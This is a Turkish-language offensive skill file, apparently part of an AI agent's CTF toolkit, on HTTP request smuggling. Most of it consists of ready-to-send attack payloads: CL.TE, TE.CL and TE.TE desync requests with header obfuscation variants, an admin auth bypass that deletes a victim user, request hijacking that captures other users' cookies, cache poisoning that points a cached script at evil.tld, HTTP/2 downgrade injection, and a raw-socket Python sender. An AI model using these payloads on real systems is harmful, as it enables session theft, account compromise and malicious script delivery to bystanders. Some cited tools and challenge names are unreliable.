---
name: http-request-smuggling
description: HTTP Request Smuggling — frontend/backend HTTP parser uyumsuzluğunu sömürerek auth bypass, cache poisoning, internal endpoint erişimi
tags: [ctf, web, http, smuggling, desync, cl-te, te-cl, te-te, h2c, http2, cache-poisoning, frontend-backend]
triggers:
  - "HTTP request smuggling"
  - "request smuggling"
  - "desync"
  - "CL.TE"
  - "TE.CL"
  - "TE.TE"
  - "Transfer-Encoding"
  - "Content-Length"
  - "chunked encoding"
  - "HAProxy + backend"
  - "frontend nginx backend"
  - "request 200ms anomaly"
  - "smuggler.py"
  - "HTTP/2 downgrade"
  - "h2c smuggling"
  - "queue poisoning"
difficulty: hard
category: web
solved_challenges:
  - "Real World CTF 2021 - Power Apps (TE.CL smuggling)"
  - "Google CTF 2020 - LITERALLY VULNERABLE (CL.TE)"
  - "Hxp 2021 - includer's revenge (smuggling + LFI)"
  - "DiceCTF 2023 - smug-dino (HTTP/2 downgrade)"
  - "HackTheBox - Updown (CL.TE basic)"
related_skills:
  - jwt-web-bypass
  - sqli-exploitation
  - ssrf-ssti-chain
---

# HTTP Request Smuggling — Frontend ve Backend'in Aynı Mesajı Farklı Okuması

İki HTTP sunucusu (frontend reverse proxy + backend) bir request'in nerede bittiğini farklı yorumlarsa, saldırgan "ikinci request"i frontend'in görmediği şekilde backend'e gönderebilir. Bu "ikinci request" sıradaki kullanıcının request'inin başına eklenir → kimlik karışması, header injection, cache poisoning.

---

## Ne Zaman Kullan

İpuçları:
- Hedef: `Server: AkamaiGHost`, `cloudfront`, `cloudflare`, `nginx` + Java/Python backend
- Yanıt sürelerinde anomaliler (CL.TE bazı request'i 5+ saniye askıda tutar)
- Üst yapıda Akamai/CDN, alt yapıda Tomcat/Express
- Auth bypass denemelerinin tutmaması (smuggling'le başlık enjekte etmen lazım)
- `Transfer-Encoding: chunked` ve `Content-Length` aynı request'te çalışan endpoint

---

## Temel Türler

### CL.TE — Frontend Content-Length, Backend Transfer-Encoding
Frontend `Content-Length`'i okur, backend `Transfer-Encoding: chunked`'i okur.

```http
POST / HTTP/1.1
Host: target.tld
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Frontend `Content-Length: 13` → "0\r\n\r\nSMUGGLED" (13 byte) tek request olarak frontend'e gelir.
- Backend `Transfer-Encoding: chunked` → ilk request "0\r\n\r\n" (boş, sonlandı). Geri kalan `SMUGGLED` = bir sonraki request'in başlangıcı.

### TE.CL — Frontend Transfer-Encoding, Backend Content-Length
```http
POST / HTTP/1.1
Host: target.tld
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

- Frontend `Transfer-Encoding: chunked` → `8\r\nSMUGGLED\r\n0\r\n\r\n` tek request.
- Backend `Content-Length: 3` → "8\r\n" 3 byte, request bitti. Geri kalan smuggled.

### TE.TE — Header Obfuscation
Hem frontend hem backend `Transfer-Encoding`'i destekler ama biri obfuscated versiyonu görmezden gelir.

```http
POST / HTTP/1.1
Host: target.tld
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: xchunked

5c
GPOST / HTTP/1.1
Host: target.tld
X-Forwarded-For: smuggled

0

```

Obfuscation varyantları:
```
Transfer-Encoding : chunked       # whitespace
Transfer-encoding: chunked        # case
Transfer-Encoding:chunked         # no space
Transfer-Encoding: chunked\r       # CR after value
Transfer-Encoding\x20: chunked    # space before colon
```

---

## Tespit

### 1. smuggler.py (Otomatik)
```bash
git clone https://github.com/defparam/smuggler
python3 smuggler.py -u https://target.tld
```

Çıktı tipik:
```
[+] Tests Passed for https://target.tld
  [CRITICAL] cl.te:
    Content-Length: 13
    Transfer-Encoding: chunked
    ...
```

### 2. Manuel — Timing-based
```python
import requests
import time

# CL.TE test
payload = """\
POST / HTTP/1.1\r
Host: target.tld\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
1\r
A\r
X\r\n\
"""

start = time.time()
r = requests.post('https://target.tld/', data=payload)
elapsed = time.time() - start

if elapsed > 5:
    print("CL.TE smuggling detected (timeout)")
```

### 3. Burp Suite — HTTP Request Smuggler
Extension marketplace'ten "HTTP Request Smuggler" eklentisi.

---

## Saldırı 1 — Auth Bypass (X-Forwarded-For Spoof)

Hedef: Admin paneli sadece `X-Forwarded-For: 127.0.0.1`'a açık.

```http
POST / HTTP/1.1
Host: target.tld
Content-Length: 130
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Host: target.tld
X-Forwarded-For: 127.0.0.1
Content-Length: 50
Content-Type: application/x-www-form-urlencoded

action=delete&user=victim
```

- Frontend ilk request'i gönderir.
- Backend ilk request'i bitirir (`0\r\n\r\n`), "ikinci" request'i smuggled olarak parse eder.
- Bir sonraki kullanıcının POST'u smuggled request'in `Content-Length: 50` ile birleşir — body kısmı kullanıcının normal request'inden gelir, ama header'lar admin yetkili!

---

## Saldırı 2 — Request Hijacking (Captura User Cookies)

Diğer kullanıcıların cookie'lerini çalmak için:

```http
POST / HTTP/1.1
Host: target.tld
Content-Length: 230
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Host: target.tld
Content-Length: 800
Content-Type: application/x-www-form-urlencoded

comment=
```

(Smuggled request'in `Content-Length` 800 = bir sonraki kullanıcı request'inin ilk 800 byte'ını "comment" olarak yutar — orada cookie var.)

Sonra `/comments` endpoint'inden kendi yorumlarımıza bakınca → diğer kullanıcının Cookie header'ı yorum olarak yer alır.

---

## Saldırı 3 — Web Cache Poisoning

```http
POST / HTTP/1.1
Host: target.tld
Content-Length: 90
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
Host: target.tld
X-Forwarded-Host: evil.tld

```

Backend smuggled request'i parse edip `/static/app.js`'i cacheler — ama `X-Forwarded-Host: evil.tld` ile, JavaScript dosyası evil.tld'den fetch eder. Tüm kullanıcılar artık evil.tld'den JS çeker → XSS yayılır.

---

## Saldırı 4 — HTTP/2 Downgrade Smuggling

Frontend HTTP/2 konuşur, backend HTTP/1.1. HTTP/2'de `Content-Length`/`Transfer-Encoding` header'ı yok — ama saldırgan body'de bunları enjekte ederse...

```
HTTP/2:
:method POST
:path /
:authority target.tld
content-length 0
transfer-encoding chunked

# H2'den downgrade edilen H1.1 versiyon:
POST / HTTP/1.1
Host: target.tld
Content-Length: 0
Transfer-Encoding: chunked

ZZZZ
```

Backend chunked görür, ZZZZ = smuggled request.

Daha güçlü H2 → request line injection:
```
HTTP/2 header:
:method GET
:path /
foo bar\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target\r\n
```

---

## Saldırı 5 — Internal Endpoint Erişimi

Backend internal API'lara erişiyor ama frontend filtreliyor:

```http
POST / HTTP/1.1
Host: target.tld
Content-Length: 100
Transfer-Encoding: chunked

0

GET /admin/internal/users HTTP/1.1
Host: localhost
Authorization: Bearer SMUGGLED_TOKEN

```

---

## Burp Repeater Manuel Test

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Send, sonra hemen 2. request'i normal göndererek "G" + ikinci request = "GET / HTTP/1.1" oluştur.

---

## Smuggling Python Helper

```python
# manual_smuggler.py
import socket
import ssl

def send_raw(host, port, data, use_tls=True):
    sock = socket.create_connection((host, port))
    if use_tls:
        ctx = ssl.create_default_context()
        sock = ctx.wrap_socket(sock, server_hostname=host)
    sock.send(data.encode() if isinstance(data, str) else data)
    response = b''
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
    sock.close()
    return response

cl_te_payload = (
    "POST / HTTP/1.1\r\n"
    "Host: target.tld\r\n"
    "Content-Length: 13\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "SMUGGLED"
)

print(send_raw('target.tld', 443, cl_te_payload))
```

---

## Tuzaklar

1. **HTTP/1.1 keepalive gerekli** — backend smuggled bytes'ı bir sonraki request'in başlangıcı olarak yorumlar, ama keepalive yoksa bağlantı kapanır.
2. **Smuggled request body'si tahmin edilemez** — bir sonraki kullanıcı POST atmazsa smuggling tetiklenmez. `/comment` gibi POST endpoint'lerinin trafiği yüksek yerleri seç.
3. **Cloudflare/Akamai modern WAF**'lar bazı smuggling vektörlerini bloklar (özellikle TE.TE obfuscation).
4. **HTTPS gerekir** — modern frontend'ler genelde HTTPS. socket.send ile raw TCP açmazsan `ssl.wrap_socket` kullan.
5. **Content-Length pozitif olmalı** — frontend negative CL'yi reddedebilir.
6. **`Connection: close` engellenir** — bağlantı yeniden açılırsa "ikinci request" boşa gider.
7. **CDN'de queue poisoning** — smuggled request CDN'in queue'sunda bekler; trafik düşük olunca timeout.

---

## smuggler.py Çıktısı Yorumlama

```
[+] SEVERE: cl.te-mode found:
    Content-Length: 13
    Transfer-Encoding: chunked
    [PAYLOAD]
```

- **CRITICAL** = kesin smuggling
- **POTENTIAL** = farklı yanıt ama doğrulanmamış
- **HARMLESS** = yanıt fark yok

---

## Cross-Skill Pivot

```
Web challenge gördün → frontend/backend tespit
                    ├── Aynı katman → klasik web saldırı (web/sqli-exploitation vb.)
                    ├── Frontend + backend farklı → smuggling test (smuggler.py)
                    ├── Auth bypass denemeleri başarısız → smuggling ile header inject
                    ├── Cache mevcut → cache poisoning smuggling
                    └── HTTP/2 servis → H2 downgrade smuggling
```

---

## Tools

```bash
pip install smuggler        # defparam/smuggler
git clone https://github.com/anshumanpattnaik/http-request-smuggling
# Burp Suite + HTTP Request Smuggler extension
```

---

## Ek Kaynaklar

- PortSwigger HTTP Request Smuggling lab serisi: https://portswigger.net/web-security/request-smuggling
- "HTTP Desync Attacks" James Kettle (Black Hat 2019)
- "HTTP/2: The Sequel is Always Worse" (Defcon 30)
- albinowax/active-scan++ — Burp extension
